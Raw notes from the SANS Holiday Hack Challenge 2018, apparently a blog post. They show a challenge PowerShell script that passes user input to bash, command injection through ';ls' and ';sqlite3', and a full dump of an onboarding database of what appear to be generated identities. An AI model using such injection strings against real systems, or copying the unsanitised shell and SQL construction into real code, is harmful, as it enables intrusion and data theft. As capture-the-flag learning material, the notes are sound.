---
draft: false
toc: false
comments: false
categories:
- Research
tags:
- CTF
title: "SANS Holiday Hack Challenge 2018 - Raw Notes"
wip: false
snippet: "SANS Holiday Hack Challenge 2018 Raw Notes - [Clean write-up](https://parsiya.net/blog/2019-01-15-sans-holiday-hack-challenge-2018-solutions/)."

---

# OSINT
Happy Trails

# vim
`q!`

# The Name Game
Using 2, it's vulnerable to command injection.

Asks for a server address and does a ping but we can inject commands after `;`.

Result of ls

```
Validating data store for employee onboard information.
Enter address of server: ;ls
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
menu.ps1  onboard.db  runtoanswer
onboard.db: SQLite 3.x database
```

`menu.ps1`

``` powershell
$global:firstrun = $TRUE

function Show-Menu
{
    $intro = @(
        "We just hired this new worker,",
        "Californian or New Yorker?",
        "Think he's making some new toy bag...",
        "My job is to make his name tag.",
        "",
        "Golly gee, I'm glad that you came,",
        "I recall naught but his last name!",
        "Use our system or your own plan,",
        "Find the first name of our guy `"Chan!`"",
        "",
        "-Bushy Evergreen",
        "",
        "To solve this challenge, determine the new worker's first name and submit to runtoanswer."
    )
    $header = @(
        "===================================================================="
        "=                                                                  =",
        "= S A N T A ' S  C A S T L E  E M P L O Y E E  O N B O A R D I N G =",
        "=                                                                  =",
        "===================================================================="
    )

    cls
    if ($global:firstrun -eq $TRUE) {
        Write-Host "`n`n"
        for ($i = 0; $i -lt $intro.length; $i++) {
            Write-Host $intro[$i]
        }
        $global:firstrun = $FALSE
    }

    Write-Host "`n`n`n"
    for ($i = 0; $i -lt $header.length; $i++) {
        Write-Host $header[$i]
    }
    Write-Host "`n`n`n"
    Write-Host ' Press '1' to start the onboard process.'
    Write-Host ' Press '2' to verify the system.'
    Write-Host ' Press 'q' to quit.'
    Write-Host "`n"
}

function Employee-Onboarding-Form
{
    Write-Host "`n`nWelcome to Santa's Castle!`n`n"
    Write-Host "At Santa's Castle, our employees are our family. We care for each other,"
    Write-Host "and support everyone in our common goals.`n"
    Write-Host "Your first test at Santa's Castle is to complete the new employee onboarding paperwork."
    Write-Host "Don't worry, it's an easy test! Just complete the required onboarding information below.`n`n"

    $efirst = Read-Host "Enter your first name.`n"
    $elast = Read-Host "Enter your last name.`n"
    $estreet1 = Read-Host "Enter your street address (line 1 of 2).`n"
    $estreet2 = Read-Host "Enter your street address (line 2 of 2).`n"
    $ecity = Read-Host "Enter your city.`n"
    $epostalcode = Read-Host "Enter your postal code.`n"
    $ephone = Read-Host "Enter your phone number.`n"
    $eemail = Read-Host "Enter your email address.`n"

    Write-Host "`n`nIs this correct?`n`n"
    Write-Host "$efirst $elast"
    Write-Host "$estreet1"
    if ($estreet2) {
        Write-Host "$estreet2"
    }
    Write-Host "$ecity, $epostalcode"
    Write-Host "$ephone"
    Write-Host "$eemail"
    $input = Read-Host 'y/n'
    if ($input -eq 'y' -Or $input -eq 'Y') {
        Write-Host "Save to sqlite DB using command line"
        Start-Process -FilePath "./sqlite3" -ArgumentList "onboard.db `"INSERT INTO onboar
d (fname, lname, street1, street2, city, postalcode, phone, email) VALUES (`'$efirst`',`'$
elast`', `'$estreet1`', `'$estreet2`', `'$ecity`', `'$epostalcode`', `'$ephone`', `'$eemai
l`')`""
    }
}
try
{
    do
    {
        Show-Menu
        $input = Read-Host 'Please make a selection'
        switch ($input)
        {
            '1' {
                cls
                Employee-Onboarding-Form
            } '2' {
                cls
                Write-Host "Validating data store for employee onboard information."
                $server = Read-Host 'Enter address of server'
                /bin/bash -c "/bin/ping -c 3 $server"
                /bin/bash -c "/usr/bin/file onboard.db"
            } '9' {
                /usr/bin/pwsh
                return
            } 'q' {
                return
            } default {
                Write-Host "Invalid entry."
            }
        }
        pause
    }
    until ($input -eq 'q')
} finally {
}
onboard.db: SQLite 3.x database
```

Just inject `;sqlite3` to be dropped into sqlite prompt.

Then do `.open onboard.db` and finally `.dump` to get everything.

``` sql
INSERT INTO "onboard" VALUES(10,'Karen','Duck','52 Annfield Rd',NULL,'BEAL','DN14 7AU','07
7 8656 6609','karensduck@einrot.com');
INSERT INTO "onboard" VALUES(11,'Josephine','Harrell','3 Victoria Road',NULL,'LITTLE ASTON','B74 8XD','079 5532 7917','josephinedharrell@einrot.com');
INSERT INTO "onboard" VALUES(12,'Jason','Madsen','4931 Cliffside Drive',NULL,'Worcester','12197','607-397-0037','jasonlmadsen@einrot.com');
INSERT INTO "onboard" VALUES(13,'Nichole','Murphy','53 St. John Street',NULL,'Craik','S4P 3Y2','306-734-9091','nicholenmurphy@teleworm.us');
INSERT INTO "onboard" VALUES(14,'Mary','Lyons','569 York Mills Rd',NULL,'Toronto','M3B 1Y2','416-274-6639','maryjlyons@superrito.com');
INSERT INTO "onboard" VALUES(15,'Luz','West','1307 Poe Lane',NULL,'Paola','66071','913-557-2372','luzcwest@rhyta.com');
INSERT INTO "onboard" VALUES(16,'Walter','Savell','4782 Neville Street',NULL,'Seymour','47274','812-580-5138','walterdsavell@fleckens.hu');
INSERT INTO "onboard" VALUES(17,'Michelle','Hicks','82 Middlewich Road',NULL,'FIRTH','ZE2 1BQ','070 2607 0997','michellejhicks@jourrapide.com');
INSERT INTO "onboard" VALUES(18,'Carolyn','Harvey','94 Friar Street',NULL,'CLEETHORPES','DN35 7YP','078 3359 6177','carolynmharvey@teleworm.us');
INSERT INTO "onboard" VALUES(19,'Julie','Westrick','4261 Corpening Drive',NULL,'Troy','48083','248-457-6093','julieswestrick@jourrapide.com');
INSERT INTO "onboard" VALUES(20,'Cara','Hodge','6 Clasper Way',NULL,'HEYSHOTT','GU29 3ZX','079 8870 5836','cararhodge@armyspy.com');
INSERT INTO "onboard" VALUES(21,'Ashley','Ramos','2326 Lauzon Parkway',NULL,'Leamington','N8H 3B9','519-329-7102','ashleywramos@superrito.com');
INSERT INTO "onboard" VALUES(22,'Marcia','Yee','17 Holburn Lane',NULL,'HELPERBY','YO6 2FT','070 2717 2611','marciamyee@armyspy.com');
INSERT INTO "onboard" VALUES(23,'Erica','McIntosh','4894 Port Washington Road',NULL,'Leslieville','T0M 1H0','403-729-0320','ericaamcintosh@cuvox.de');
INSERT INTO "onboard" VALUES(24,'Franklyn','Goldsmith','25 Hillside Street',NULL,'Paradise Valley','85253','480-513-4464','franklynngoldsmith@teleworm.us');
INSERT INTO "onboard" VALUES(25,'Christopher','Green','4896 Lynden Road',NULL,'Moonstone','L0K 1N0','705-835-6976','christopherngreen@fleckens.hu');
INSERT INTO "onboard" VALUES(26,'Reggie','Little','285 Kidd Avenue',NULL,'Anchorage','99501','907-932-8909','reggiehlittle@gustr.com');
INSERT INTO "onboard" VALUES(27,'Mary','Hawes','91 George Avenue',NULL,'Belle Fontaine','36607','251-245-0433','maryrhawes@gustr.com');
INSERT INTO "onboard" VALUES(28,'Blanche','Webster','2695 Airport Blvd',NULL,'Gander','A1V 2M7','709-234-5453','blancherwebster@dayrep.com');
INSERT INTO "onboard" VALUES(29,'Antonio','Herbert','637 Lynden Road',NULL,'Lefroy','L0L 1W0','705-456-6107','antoniogherbert@einrot.com');
INSERT INTO "onboard" VALUES(30,'Elisabeth','George','4667 Harley Brook Lane',NULL,'Johnstown','15904','814-592-3905','elisabethmgeorge@teleworm.us');
INSERT INTO "onboard" VALUES(31,'Mark','Dinkins','3593 Private Lane',NULL,'Albany','31701','229-281-7470','markndinkins@einrot.com');
INSERT INTO "onboard" VALUES(32,'Melody','Mendoza','2900 Reserve St',NULL,'Castleton','K0K 1M0','905-344-8354','melodywmendoza@gustr.com');
INSERT INTO "onboard" VALUES(33,'Reginald','Duncan','3606 Michigan Avenue',NULL,'Bolivar','15923','724-676-9897','reginaldvduncan@jourrapide.com');
INSERT INTO "onboard" VALUES(34,'Jessica','Munk','51 Cunnery Rd',NULL,'MAESYCRUGIAU','SA39 8FJ','078 6965 8387','jessicaamunk@fleckens.hu');
INSERT INTO "onboard" VALUES(35,'Aaron','Pasley','41 Glenurquhart Road',NULL,'BALLIEMORE','PA34 5WH','077 6882 0012','aaronrpasley@rhyta.com');
INSERT INTO "onboard" VALUES(36,'Randy','Johnson','1545 Woodvale Drive',NULL,'Fingal','N0L 1K0','519-769-3889','randydjohnson@fleckens.hu');
INSERT INTO "onboard" VALUES(37,'Mary','Tucker','1306 Winding Way',NULL,'Providence','2906','401-692-8503','marybtucker@jourrapide.com');
INSERT INTO "onboard" VALUES(38,'Timothy','Montgomery','83 Academy Street',NULL,'BETHEL','LL21 1HD','070 6084 3545','timothyrmontgomery@superrito.com');
INSERT INTO "onboard" VALUES(39,'Elizabeth','Fox','1044 Tanner Street',NULL,'Vancouver','V5R 2T4','604-436-2749','elizabethmfox@jourrapide.com');
INSERT INTO "onboard" VALUES(40,'Clifford','Moore','41 Telford Street',NULL,'BARKHAM','RG41 9TQ','079 5681 0730','cliffordlmoore@fleckens.hu');
INSERT INTO "onboard" VALUES(41,'Clifford','Williams','24 Tonbridge Rd',NULL,'COOKNEY','AB3 5DY','078 6260 1601','cliffordcwilliams@dayrep.com');
INSERT INTO "onboard" VALUES(42,'Diane','Stewart','3825 Tully Street',NULL,'Livonia','48150','313-721-7835','dianewstewart@gustr.com');
INSERT INTO "onboard" VALUES(43,'Jane','Purdue','4522 Maple Court',NULL,'Macks Creek','65786','573-363-6930','janejpurdue@armyspy.com');
INSERT INTO "onboard" VALUES(44,'Donna','Reynolds','15 Folkestone Road',NULL,'WINCHMORE HILL','HP7 6UG','077 3596 0968','donnajreynolds@teleworm.us');
INSERT INTO "onboard" VALUES(45,'Mae','Gonzalez','4982 Yonge Street',NULL,'Toronto','M4W 1J7','416-318-6431','maedgonzalez@rhyta.com');
INSERT INTO "onboard" VALUES(46,'Julia','Mullenix','98 Graham Road',NULL,'CHEVITHORNE','EX16 9WE','079 4511 1929','juliapmullenix@armyspy.com');
INSERT INTO "onboard" VALUES(47,'Kathleen','Hudson','2102 rue Saint-Édouard',NULL,'Trois Rivieres','G9A 5S8','819-694-7235','kathleenshudson@dayrep.com');
INSERT INTO "onboard" VALUES(48,'Jose','Salas','801 Paradise Crescent',NULL,'Hauterive','G5C 1M1','418-589-3293','joseasalas@armyspy.com');
INSERT INTO "onboard" VALUES(49,'Suzanne','Ziegler','90 East Street',NULL,'MARK','TA9 7JE','078 2398 8807','suzannejziegler@fleckens.hu');
INSERT INTO "onboard" VALUES(50,'Stella','Worsham','910 Hart Country Lane',NULL,'Atlanta','30303','706-530-2741','stellasworsham@fleckens.hu');
INSERT INTO "onboard" VALUES(51,'Donald','Dupree','85 Glenurquhart Road',NULL,'BALLAUGH','IM7 9LT','070 2322 3531','donaldvdupree@teleworm.us');
INSERT INTO "onboard" VALUES(52,'Dolores','Carroll','81 Guildford Rd',NULL,'EAST HYDE','LU1 8ZF','070 5400 2455','dolorespcarroll@teleworm.us');
INSERT INTO "onboard" VALUES(53,'Danny','Pink','3962 Walnut Drive',NULL,'Fargo','58103','701-371-7143','dannycpink@fleckens.hu');
INSERT INTO "onboard" VALUES(54,'Dorothy','Rowe','4402 St Marys Rd',NULL,'Winnipeg','R3C 3N9','204-951-1482','dorothydrowe@rhyta.com');
INSERT INTO "onboard" VALUES(55,'Verna','Mashburn','4870 Trymore Road',NULL,'Clements','56224','507-692-6468','vernafmashburn@fleckens.hu');
INSERT INTO "onboard" VALUES(56,'Patsy','Mendez','629 Deer Ridge Drive',NULL,'Wayne','7477','973-641-9131','patsyamendez@cuvox.de');
INSERT INTO "onboard" VALUES(57,'Stan','Neel','4327 Embro St',NULL,'Innerkip','N0J 1M0','519-469-7243','stanjneel@gustr.com');
INSERT INTO "onboard" VALUES(58,'Scott','Casperson','402 Echo Lane',NULL,'Middleville','49333','269-795-1629','scottfcasperson@cuvox.de');
INSERT INTO "onboard" VALUES(59,'Roger','Waller','4974 Wiseman Street',NULL,'Jefferson City','37760','865-471-2287','rogertwaller@jourrapide.com');
INSERT INTO "onboard" VALUES(60,'Cary','Hurst','3567 Cooks Mine Road',NULL,'Las Cruces','88005','505-679-9488','caryghurst@jourrapide.com');
INSERT INTO "onboard" VALUES(61,'Tyler','Joseph','177 James Street',NULL,'Aldergrove','V5G 4S4','604-866-1097','tylersjoseph@rhyta.com');
INSERT INTO "onboard" VALUES(62,'Susie','Higa','80 Broad Street',NULL,'LOWER PENNINGTON','SO41 4BA','070 7312 1513','susiekhiga@dayrep.com');
INSERT INTO "onboard" VALUES(63,'Linda','Crawford','4060 Ross Street',NULL,'Smiths Falls','K7A 1C2','613-284-5165','lindakcrawford@jourrapide.com');
INSERT INTO "onboard" VALUES(64,'Katherine','Charney','622 137th Avenue',NULL,'Edmonton','T5J 0X2','780-669-4710','katherinefcharney@einrot.com');
INSERT INTO "onboard" VALUES(65,'Gretchen','Barthel','31 Kingsway North',NULL,'HOLSWORTHY','EX22 8EB','070 6551 4496','gretchencbarthel@gustr.com');
INSERT INTO "onboard" VALUES(66,'Marvin','Kennedy','34 Lamphey Road',NULL,'THE WYKE','TF11 1YR','078 6972 2991','marvinlkennedy@jourrapide.com');
INSERT INTO "onboard" VALUES(67,'Oretha','Wyss','4446 Davis Street',NULL,'Augusta','30901','706-365-8842','orethajwyss@fleckens.hu');
INSERT INTO "onboard" VALUES(68,'Brenda','Lowe','41 West Lane',NULL,'DALGONAR','DG3 8DP','070 5591 8305','brendaclowe@gustr.com');
INSERT INTO "onboard" VALUES(69,'Christina','Lewis','70 Thames Street',NULL,'BONNYBANK','KY8 1BG','070 1509 9499','christinaflewis@fleckens.hu');
INSERT INTO "onboard" VALUES(70,'Beatrice','Bullock','77 Abingdon Road',NULL,'BRANTWOOD','LA21 5PZ','079 6195 4027','beatricefbullock@superrito.com');
INSERT INTO "onboard" VALUES(71,'William','Higgins','65 Roman Rd',NULL,'LEDBURY','HR8 5JJ','079 2677 5229','williamchiggins@superrito.com');
INSERT INTO "onboard" VALUES(72,'Francis','Fails','1382 Papineau Avenue',NULL,'Montreal','H2K 4J5','514-402-7359','francispfails@armyspy.com');
INSERT INTO "onboard" VALUES(73,'Anthony','Gould','1689 Hammarskjold Dr',NULL,'Burnaby','V5B 3C9','604-293-7978','anthonyjgould@armyspy.com');
INSERT INTO "onboard" VALUES(74,'John','Gaston','2090 St Jean Baptiste St',NULL,'St Ludger','G0M 1W0','819-548-7107','johnegaston@gustr.com');
INSERT INTO "onboard" VALUES(75,'Judy','Franklin','15 Broomfield Place',NULL,'STONE STREET','IP19 3NA','078 6676 2490','judycfranklin@rhyta.com');
INSERT INTO "onboard" VALUES(76,'Vanessa','Hartsock','92 Middlewich Road',NULL,'FIVE ASH DOWN','TN22 0JT','077 2279 2150','vanessashartsock@einrot.com');
INSERT INTO "onboard" VALUES(77,'Lois','Martin','74 Consett Rd',NULL,'HIGHLAWS','CA5 6SD','077 2846 0658','loisjmartin@cuvox.de');
INSERT INTO "onboard" VALUES(78,'Charles','Mejia','64 Newgate Street',NULL,'JACKTON','G75 8QB','078 0038 5514','charlesbmejia@fleckens.hu');
INSERT INTO "onboard" VALUES(79,'Francisco','Guajardo','2074 Kerry Way',NULL,'Irvine','92614','562-832-4500','franciscolguajardo@dayrep.com');
INSERT INTO "onboard" VALUES(80,'Danny','Williams','4736 47th Avenue',NULL,'Boyle','T0A 0M0','780-689-7571','dannynwilliams@rhyta.com');
INSERT INTO "onboard" VALUES(81,'Juan','Bowen','1968 Danforth Avenue',NULL,'Toronto','M4K 1A6','416-476-9751','juanabowen@teleworm.us');
INSERT INTO "onboard" VALUES(82,'Jim','Hill','3518 Main St',NULL,'Wolfville','B0P 1X0','902-697-6163','jimchill@teleworm.us');
INSERT INTO "onboard" VALUES(83,'Joseph','Johnson','3443 Delaware Avenue',NULL,'San Francisco','94108','415-274-4354','josephjjohnson@cuvox.de');
INSERT INTO "onboard" VALUES(84,'Scott','Chan','48 Colorado Way',NULL,'Los Angeles','90067','4017533509','scottmchan90067@gmail.com');
INSERT INTO "onboard" VALUES(85,'Pat','Shaffer','97 Southern Way',NULL,'NORTH SCARLE','LN6 7SE','070 5181 8156','patcshaffer@superrito.com');
INSERT INTO "onboard" VALUES(86,'John','Bishop','59 North Road',NULL,'NETHER HEYFORD','NN7 3TE','077 7175 9692','johnebishop@jourrapide.com');
INSERT INTO "onboard" VALUES(87,'Mattie','Rodriguez','2993 Yonge Street',NULL,'Toronto','M4W 1J7','416-720-2724','mattierrodriguez@armyspy.com');
INSERT INTO "onboard" VALUES(88,'Pearl','McCord','11 Boughton Rd',NULL,'WICKHAM ST PAUL','CO9 0QG','078 3015 0064','pearldmccord@superrito.com');
INSERT INTO "onboard" VALUES(89,'Laurie','Ng','1652 Higginsville Road',NULL,'Windsor','B0N 2T0','902-472-1603','lauriejng@fleckens.hu');
INSERT INTO "onboard" VALUES(90,'Tanya','Thomason','2386 Center Street',NULL,'Eugene','97401','541-915-2732','tanyamthomason@cuvox.de');
INSERT INTO "onboard" VALUES(91,'Sherry','Hinton','87 Southend Avenue',NULL,'BLACKFORDBY','DE11 5QN','070 8154 8258','sherrythinton@gustr.com');
INSERT INTO "onboard" VALUES(92,'Dwayne','Straight','3870 Ottis Street',NULL,'Minco','73059','405-352-0132','dwaynejstraight@gustr.com');
INSERT INTO "onboard" VALUES(93,'Tina','Houser','4195 Quayside Dr',NULL,'New Westminster','V3M 6A1','778-238-8700','tinaahouser@teleworm.us');
INSERT INTO "onboard" VALUES(94,'Deborah','Soileau','3938 Goyeau Ave',NULL,'Windsor','N9A 1H9','519-890-6446','deborahjsoileau@teleworm.us');
INSERT INTO "onboard" VALUES(95,'Sharon','Leitch','4608 Snowbird Lane',NULL,'Omaha','68104','402-689-8335','sharonjleitch@superrito.com');
INSERT INTO "onboard" VALUES(96,'Julia','Nunn','3166 rue des Églises Est',NULL,'Arntfield','J0Z 1B0','819-279-8802','julialnunn@fleckens.hu');
INSERT INTO "onboard" VALUES(97,'Emma','Anton','950 Carling Avenue',NULL,'Ottawa','K1Z 7B5','613-799-8843','emmawanton@einrot.com');
INSERT INTO "onboard" VALUES(98,'Margaret','Janes','1476 Boone Street',NULL,'Alice','78332','361-207-8407','margaretcjanes@fleckens.hu');
INSERT INTO "onboard" VALUES(99,'Terry','Morgan','441 Fallon Drive',NULL,'Mount Forest','N0G 2L2','519-321-3224','terryjmorgan@fleckens.hu');
INSERT INTO "onboard" VALUES(100,'Adam','Cooper','4791 Waterton Avenue',NULL,'Pincher Creek','T0K 1W0','403-632-1856','adamhcooper@superrito.com');
INSERT INTO "onboard" VALUES(101,'Diane','McCartney','845 Lauzon Parkway',NULL,'Leamington','N8H 3B1','519-322-3658','dianekmccartney@cuvox.de');
INSERT INTO "onboard" VALUES(102,'Thomas','Buss','57 Canterbury Road',NULL,'UPWARE','CB7 3NH','078 7137 8440','thomaspbuss@cuvox.de');
INSERT INTO "onboard" VALUES(103,'Amanda','Johnson','40 Whatlington Road',NULL,'COULSTON','BA13 9BA','070 2755 4430','amandacjohnson@gustr.com');
INSERT INTO "onboard" VALUES(104,'Stella','Jones','90 Maidstone Road',NULL,'WENTNOR','SY9 1NN','078 6029 1533','stellajjones@gustr.com');
INSERT INTO "onboard" VALUES(105,'Angela','Linder','83 Roman Rd',NULL,'LEE MILL BRIDGE','PL7 5NW','079 3061 8143','angelaelinder@teleworm.us');
INSERT INTO "onboard" VALUES(106,'Lance','Schill','1488 Oakway Lane',NULL,'Los Angeles','90017','818-253-8238','lancesschill@jourrapide.com');
INSERT INTO "onboard" VALUES(107,'Mary','Smith','42 Fulford Road',NULL,'PENPONT','DG3 2SN','078 4426 8667','maryjsmith@rhyta.com');
INSERT INTO "onboard" VALUES(108,'Joseph','Beck','20 Seaford Road',NULL,'CULLIPOOL','PA34 8BP','078 4405 7430','josephsbeck@gustr.com');
INSERT INTO "onboard" VALUES(109,'Edward','Dawkins','1259 Selah Way',NULL,'Winooski','5404','802-654-3001','edwardhdawkins@superrito.com');
INSERT INTO "onboard" VALUES(110,'Kevin','Torres','714 Myra Street',NULL,'Providence','2903','401-488-9912','kevindtorres@superrito.com');
INSERT INTO "onboard" VALUES(111,'Cameron','Wells','4822 Rhapsody Street',NULL,'Gainesville','32601','352-337-5273','cameronrwells@armyspy.com');
INSERT INTO "onboard" VALUES(112,'Louis','Garcia','4217 Burwell Heights Road',NULL,'Houston','77027','409-555-7232','louisvgarcia@armyspy.com');
INSERT INTO "onboard" VALUES(113,'Stacey','White','82 Well Lane',NULL,'PATRIXBOURNE','CT4 6SZ','079 7426 2830','staceywwhite@teleworm.us');
INSERT INTO "onboard" VALUES(114,'Jean','Cruise','798 40th Street',NULL,'Calgary','T2K 0P7','403-275-7274','jeanbcruise@armyspy.com');
INSERT INTO "onboard" VALUES(115,'Omega','Stamm','15 Whatlington Road',NULL,'COWAN BRIDGE','LA6 9WU','077 5586 6506','omegafstamm@jourrapide.com');
INSERT INTO "onboard" VALUES(116,'Claudia','Cantrell','24 Trehafod Road',NULL,'BUCKLEBURY','RG7 2TS','078 5083 3233','claudiatcantrell@jourrapide.com');
INSERT INTO "onboard" VALUES(117,'Joann','Kellar','80 Petworth Rd',NULL,'DUNSTON','ST18 9BR','079 7011 8965','joannskellar@cuvox.de');
INSERT INTO "onboard" VALUES(118,'Dexter','Figueroa','2294 Broadmoor Blvd',NULL,'Sherwood Park','T8A 1V6','780-662-7299','dexterbfigueroa@cuvox.de');
INSERT INTO "onboard" VALUES(119,'Debbie','Gee','49 Sandyhill Rd',NULL,'GAICK LODGE','PH21 7WE','070 8515 8276','debbiergee@armyspy.com');
INSERT INTO "onboard" VALUES(120,'Lilian','Finn','1836 Reserve St',NULL,'Long Sault','K0L 1P0','613-534-6303','liliankfinn@einrot.com');
INSERT INTO "onboard" VALUES(121,'Estelle','Avila','45 Ash Lane',NULL,'YIEWSLEY','UB7 5YQ','078 6560 6052','estelleravila@jourrapide.com');
INSERT INTO "onboard" VALUES(122,'John','Gill','2268 Red Bud Lane',NULL,'Rochelle Park','7662','862-370-8712','johnagill@gustr.com');
INSERT INTO "onboard" VALUES(123,'Lisa','Arsenault','92 West Lane',NULL,'DARENTH','DA2 1ZJ','078 7094 2406','lisajarsenault@gustr.com');
INSERT INTO "onboard" VALUES(124,'John','Garcia','56 Golden Knowes Road',NULL,'FRIESTHORPE','LN3 0HE','070 1447 9983','johnsgarcia@cuvox.de');
INSERT INTO "onboard" VALUES(125,'Melvin','Carlucci','2232 Yonge Street',NULL,'Toronto','M4W 1J7','416-961-5670','melvinlcarlucci@cuvox.de');
INSERT INTO "onboard" VALUES(126,'Stefan','Sanchez','36 Trehafod Road',NULL,'BUCKLAND BREWER','EX39 8YL','077 3783 9813','stefanksanchez@rhyta.com');
INSERT INTO "onboard" VALUES(127,'Sylvia','Shaver','1317 47th Avenue',NULL,'Lac La Biche','T0A 2C0','780-404-8373','sylviaoshaver@dayrep.com');
INSERT INTO "onboard" VALUES(128,'Ka','Venne','4953 Doctors Drive',NULL,'El Segundo','90245','310-364-8308','kagvenne@cuvox.de');
INSERT INTO "onboard" VALUES(129,'Ofelia','Graham','88 Broomfield Place',NULL,'STONEBRIDGE','CV7 9JE','070 4014 2835','ofeliahgraham@teleworm.us');
INSERT INTO "onboard" VALUES(130,'Teresa','Clayton','2121 Elk Rd Little',NULL,'Tucson','85712','520-237-6700','teresajclayton@teleworm.us');
INSERT INTO "onboard" VALUES(131,'Ronald','Killion','663 40th Street',NULL,'Calgary','T2P 2V7','403-539-0482','ronaldbkillion@cuvox.de');
INSERT INTO "onboard" VALUES(132,'Diane','Moore','346 Dundas St',NULL,'Toronto','M2N 2G8','416-218-0180','dianebmoore@dayrep.com');
INSERT INTO "onboard" VALUES(133,'Eva','Dahlstrom','92 47th Avenue',NULL,'Waskatenau','T0A 3P0','780-358-8646','evacdahlstrom@superrito.com');
INSERT INTO "onboard" VALUES(134,'Marie','Davis','86 Sea Road',NULL,'LAMLOCH','DG7 9GF','077 6603 5676','mariemdavis@cuvox.de');
INSERT INTO "onboard" VALUES(135,'Linda','Broomfield','4780 Woodstock Drive',NULL,'El Monte','91731','626-456-3955','lindambroomfield@dayrep.com');
INSERT INTO "onboard" VALUES(136,'Daniel','Reed','84 Buckingham Rd',NULL,'THORNTON-LE-BEANS','DL6 8HP','079 7101 0192','danieldreed@rhyta.com');
INSERT INTO "onboard" VALUES(137,'Douglas','Porter','17 Scarcroft Road',NULL,'PORTH','CF39 9EU','079 5441 7939','douglasfporter@jourrapide.com');
INSERT INTO "onboard" VALUES(138,'Lawrence','Heck','4919 Speers Road',NULL,'Brampton','L6T 3W9','905-793-4570','lawrencerheck@fleckens.hu');
INSERT INTO "onboard" VALUES(139,'Rachel','Trent','4653 Haaglund Rd',NULL,'Lower Post','V0H 0H0','250-779-0723','racheljtrent@teleworm.us');
INSERT INTO "onboard" VALUES(140,'Iva','Johnson','2939 Quilly Lane',NULL,'Westerville','43081','614-544-2873','ivadjohnson@jourrapide.com');
INSERT INTO "onboard" VALUES(141,'Lance','Arceo','86 Kingsway North',NULL,'HOLMSIDE','DH7 9EW','070 5772 3162','lancemarceo@cuvox.de');
INSERT INTO "onboard" VALUES(142,'Valerie','Howell','1142 rue Levy',NULL,'Montreal','H3C 5K4','514-774-5866','valeriedhowell@superrito.com');
INSERT INTO "onboard" VALUES(143,'Mary','Poirier','2038 Stutler Lane',NULL,'Bedford','15522','814-423-2173','marydpoirier@einrot.com');
INSERT INTO "onboard" VALUES(144,'Susanne','Camp','4146 Galts Ave',NULL,'Red Deer','T4N 5Z9','403-373-2195','susannewcamp@armyspy.com');
INSERT INTO "onboard" VALUES(145,'Ron','Peters','1364 137th Avenue',NULL,'Edmonton','T5M 3K3','780-454-1668','ronlpeters@rhyta.com');
INSERT INTO "onboard" VALUES(146,'Marjory','Bryant','4129 Court Street',NULL,'Eureka','63025','636-587-5083','marjorykbryant@dayrep.com');
INSERT INTO "onboard" VALUES(147,'Betty','Pratt','68 Oxford Rd',NULL,'WOOTTON','CT4 5WA','070 4977 6152','bettygpratt@gustr.com');
INSERT INTO "onboard" VALUES(148,'Regina','Chen','3930 Chestnut Street',NULL,'Tampa','3361
9','727-482-0568','reginalchen@cuvox.de');
INSERT INTO "onboard" VALUES(149,'Charles','Atkins','418 Hood Avenue',NULL,'San Diego','92
111','858-694-9634','charlesmatkins@gustr.com');
INSERT INTO "onboard" VALUES(150,'Lawrence','Taylor','91 Scarcroft Road',NULL,'PORT LOGAN'
,'DG9 5LG','077 3050 1172','lawrencejtaylor@cuvox.de');
INSERT INTO "onboard" VALUES(151,'Pam','Goudy','1785 Russell Street',NULL,'Woburn','1801',
'978-853-5666','pamgoudy@einrot.com');
INSERT INTO "onboard" VALUES(152,'Evelyn','Evans','2438 Reserve St',NULL,'Parham','K0H 2K0
','613-375-6041','evelyndevans@cuvox.de');
INSERT INTO "onboard" VALUES(153,'Janice','Atkin','85 Oxford Rd',NULL,'WORK','KW15 5EF','0
78 8718 3013','janicebatkin@dayrep.com');
INSERT INTO "onboard" VALUES(154,'Hazel','Merrick','3751 Owen Lane',NULL,'Naples','33940',
'239-263-5968','hazelbmerrick@cuvox.de');
INSERT INTO "onboard" VALUES(155,'Pearlene','Ferrell','1410 Dominion St',NULL,'Finch','K0C
 1K0','613-984-2873','pearlenetferrell@teleworm.us');
INSERT INTO "onboard" VALUES(156,'Peggy','Harper','1846 Davis Street',NULL,'Chickamauga','
30707','706-382-7319','peggyaharper@armyspy.com');
INSERT INTO "onboard" VALUES(157,'Carol','Lindsey','4211 40th Street',NULL,'Calgary','T2M 
0X4','403-210-8234','carolglindsey@gustr.com');
INSERT INTO "onboard" VALUES(158,'Santiago','Field','4783 Merivale Road',NULL,'Kanata','K2
K 1L9','613-592-3285','santiagobfield@einrot.com');
INSERT INTO "onboard" VALUES(159,'Hugh','Torres','3773 Northumberland Street',NULL,'Baden'
,'N0B 1G0','519-634-7229','hughbtorres@teleworm.us');
INSERT INTO "onboard" VALUES(160,'Claudia','Halpin','3248 Colonial Drive',NULL,'College St
ation','77840','979-764-7262','claudiajhalpin@armyspy.com');
INSERT INTO "onboard" VALUES(161,'Christopher','Windham','2310 Barton Street',NULL,'Stoney
 Creek','L8G 2V1','905-664-5559','christopheruwindham@fleckens.hu');
INSERT INTO "onboard" VALUES(162,'Theodore','Young','4201 Providence Lane',NULL,'Anaheim',
'92801','626-803-1180','theodoresyoung@cuvox.de');
INSERT INTO "onboard" VALUES(163,'Lauren','Casey','4455 Fallon Drive',NULL,'Hensall','N0M 
1X0','519-263-7462','laurenjcasey@jourrapide.com');
INSERT INTO "onboard" VALUES(164,'Molly','Logan','1544 St George Street',NULL,'Vancouver',
'V5T 1Z7','604-871-8098','mollyhlogan@jourrapide.com');
INSERT INTO "onboard" VALUES(165,'Alan','Guinn','3395 Galts Ave',NULL,'Red Deer','T4N 2A6'
,'403-309-5523','alanmguinn@fleckens.hu');
INSERT INTO "onboard" VALUES(166,'Brenda','Johnson','65 Northgate Street',NULL,'BETLEY','C
W3 1TE','070 1362 3463','brendatjohnson@gustr.com');
INSERT INTO "onboard" VALUES(167,'Catherine','Priest','1144 McDonald Avenue',NULL,'Orlando
','32810','407-924-7464','catherinebpriest@superrito.com');
INSERT INTO "onboard" VALUES(168,'William','McCoy','1019 Benson Park Drive',NULL,'Newcastl
e','73065','405-387-6925','williammmccoy@superrito.com');
INSERT INTO "onboard" VALUES(169,'Stephanie','Jaynes','1854 Tycos Dr',NULL,'Toronto','M5T 
1T4','416-605-0198','stephaniejjaynes@rhyta.com');
COMMIT;
sqlite> 
```

## Objective 2
